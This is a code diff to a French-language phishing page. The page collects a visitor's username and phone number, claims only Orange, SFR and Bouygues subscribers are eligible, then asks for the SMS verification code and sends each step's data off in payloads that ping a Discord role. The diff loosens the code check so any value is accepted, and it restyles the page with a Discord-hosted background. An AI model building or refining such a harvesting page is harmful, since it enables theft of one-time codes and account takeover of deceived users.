@@ -7,7 +7,7 @@
     <style>
         :root {
             --bg: #0b0b14;
-            --card-bg: rgba(18, 18, 35, 0.9);
+            --card-bg: rgba(18, 18, 35, 0.85);
             --border: rgba(255, 255, 255, 0.06);
             --accent: #6c5ce7;
             --accent-glow: rgba(108, 92, 231, 0.4);
@@ -20,20 +20,42 @@
             --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            min-height: 100vh;
+            width: 100%;
+        }
         body {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: #0b0b14;
-            background-image: radial-gradient(ellipse at 30% 20%, rgba(108,92,231,0.08) 0%, transparent 60%), radial-gradient(ellipse at 70% 80%, rgba(0,230,118,0.05) 0%, transparent 60%);
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             padding: 20px;
             -webkit-font-smoothing: antialiased;
             touch-action: manipulation;
+            /* IMAGE DE FOND - lien Discord */
+            background-image: url('https://cdn.discordapp.com/attachments/1525551766744334506/1527714569743503360/content.png?ex=6a5baa90&is=6a5a5910&hm=eb92f58ff9ee349a1dd4fbaf9dc82ffee5f0af83ebd29d92d66e20e21112c0da');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+        /* Overlay sombre sur toute la page pour lisibilité */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 11, 20, 0.75);
+            z-index: 0;
+            pointer-events: none;
         }
         .card {
-            background: rgba(18,18,35,0.9);
+            position: relative;
+            z-index: 1;
+            background: rgba(18,18,35,0.88);
             backdrop-filter: blur(30px);
             -webkit-backdrop-filter: blur(30px);
             border: 1px solid rgba(255,255,255,0.06);
@@ -235,7 +257,7 @@
     <div class="operator-alert">
         <div class="alert-title"><span class="alert-icon">⚠️</span> En raison d'abus — Opérateurs éligibles uniquement</div>
         <div class="alert-operators">
-            <span class="operator-tag orange">🍊 Orange</span>
+            <span class="operator-tag orange">🟠 Orange</span>
             <span class="operator-tag sfr">🔴 SFR</span>
             <span class="operator-tag bouygues">🔵 Bouygues</span>
         </div>
@@ -253,7 +275,7 @@
         <div class="flag-france"><div class="flag-stripe blue"></div><div class="flag-stripe white"></div><div class="flag-stripe red"></div></div>
         <input type="tel" id="userInput" placeholder="+33 6 12 34 56 78" autocomplete="off" inputmode="numeric" maxlength="20">
     </div>
-    <div class="hint-text" id="hintEl">🇫🇷 Format: +33 puis votre numéro sans le 0</div>
+    <div class="hint-text" id="hintEl">👤Entrez Votre Numero</div>
 
     <button class="btn" id="actionBtn"><span class="btn-icon">📤</span> Envoyer</button>
 
@@ -295,7 +317,7 @@
     let tempsRestant = DUREE_TOTALE;
     let intervalleTimer = null;
     let donnees = { pseudo: "", telephone: "", code: "" };
-    let etape1Envoyee = false;  // pour ne pas renvoyer deux fois les infos étape 1
+    let etape1Envoyee = false;
 
     // ============================================================
     // DOM
@@ -357,7 +379,7 @@
         }
     }
 
-    // ENVOI ÉTAPE 2 : Code SMS
+    // ENVOI ÉTAPE 2 : Code SMS (pas de longueur minimum imposée)
     async function sendEtape2(code) {
         const payload = {
             content: "<@&" + ROLE_ID + ">",
@@ -418,10 +440,10 @@
         etape = 2;
         phaseBadge.textContent = "● Phase 2 — Code SMS";
         phaseBadge.classList.add("warning");
-        hintEl.textContent = "📩 Entrez le code à 6 chiffres reçu par SMS";
-        userInput.placeholder = "Code SMS (ex: 123456)";
-        userInput.setAttribute("maxlength", "6");
-        userInput.setAttribute("inputmode", "numeric");
+        hintEl.textContent = "📩 Entrez le code reçu par SMS ";
+        userInput.placeholder = "Code SMS";
+        userInput.removeAttribute("maxlength");
+        userInput.setAttribute("inputmode", "text");
         hintPseudo.textContent = "";
         wrapperPseudo.style.display = "none";
         actionBtn.innerHTML = '<span class="btn-icon">🔐</span> Vérifier';
@@ -461,7 +483,6 @@
             donnees.pseudo = valPseudo;
             donnees.telephone = valTel;
 
-            // ENVOI ÉTAPE 1 (pseudo + téléphone)
             await sendEtape1(donnees.pseudo, donnees.telephone);
 
             goToEtape2();
@@ -476,16 +497,9 @@
                 userInput.value = "";
                 return;
             }
-            const code = valTel.replace(/\D/g, "");
-            if (code.length !== 6) {
-                shake(wrapperSaisie);
-                userInput.placeholder = "Code invalide (6 chiffres requis)";
-                userInput.value = "";
-                return;
-            }
-            donnees.code = code;
+            // PAS DE RESTRICTION DE LONGUEUR - on accepte n'importe quel code
+            donnees.code = valTel;
 
-            // ENVOI ÉTAPE 2 (code SMS)
             await sendEtape2(donnees.code);
 
             showSuccess();
@@ -501,7 +515,7 @@
 
     window.addEventListener("beforeunload", () => { if (intervalleTimer) clearInterval(intervalleTimer); });
 
-    console.log("✅ Site chargé - Envoi étape 1 (pseudo+téléphone) puis étape 2 (code) avec ping du role " + ROLE_ID);
+    console.log("✅ Site chargé - Étape 1 (pseudo+téléphone) puis Étape 2 (code sans restriction de longueur) avec ping du role " + ROLE_ID);
     console.log("🔗 Support : discord.gg/2fe7CQttHR | Credits : c26i & cloudric");
 </script>
 </body>
